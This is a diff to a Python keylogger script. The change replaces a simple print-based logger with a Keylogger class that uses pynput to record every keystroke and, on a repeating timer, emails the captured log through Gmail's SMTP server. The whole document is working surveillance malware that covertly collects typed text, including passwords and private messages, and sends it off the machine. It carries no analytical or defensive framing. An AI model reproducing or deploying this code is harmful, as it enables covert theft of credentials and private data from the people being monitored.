@@ -1,30 +1,45 @@
 #!/usr/bin/env python3
+import smtplib
 import pynput.keyboard
 import threading
 
-log = ""
 
+class Keylogger:
+    def __init__(self, time_interval,email,password):
+        self.log = "Keylogger started"
+        self.interval = time_interval
+        self.email = email
+        self.password = password
 
-def procces_key_press(key):
-    global log
-    try:
-        log = log + str(key.char)
-    except AttributeError:
-        if key == key.space:
-            log = log + " "
-        else:
-            log = log + " " + str(key) + " "
-    print(log)
+    def append_to_log(self, string):
+        self.log = self.log + string
 
+    def procces_key_press(self, key):
+        try:
+            current_key = str(key.char)
+        except AttributeError:
+            if key == key.space:
+                current_key = " "
+            else:
+                current_key = " " + str(key) + " "
+        self.append_to_log(current_key)
 
-def report():
-    global log
-    log = ""
-    timer = threading.Timer(5, report)
-    timer.start()
+    def report(self):
+        self.send_mail(self.email,self.password,self.log)
+        self.log = ""
+        timer = threading.Timer(self.interval, self.report)
+        timer.start()
 
+    def start(self):
+        keyboard_listener = pynput.keyboard.Listener(on_press=self.procces_key_press)
+        with keyboard_listener:
+            self.report()
+            keyboard_listener.join()
 
-keyboard_listener = pynput.keyboard.Listener(on_press=procces_key_press)
-with keyboard_listener:
-    report()
-    keyboard_listener.join()
+    def send_mail(self,email, password, message):
+        print("Sending Email....."+" ","\n\n"+self.log)
+        server = smtplib.SMTP("smtp.gmail.com", 587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
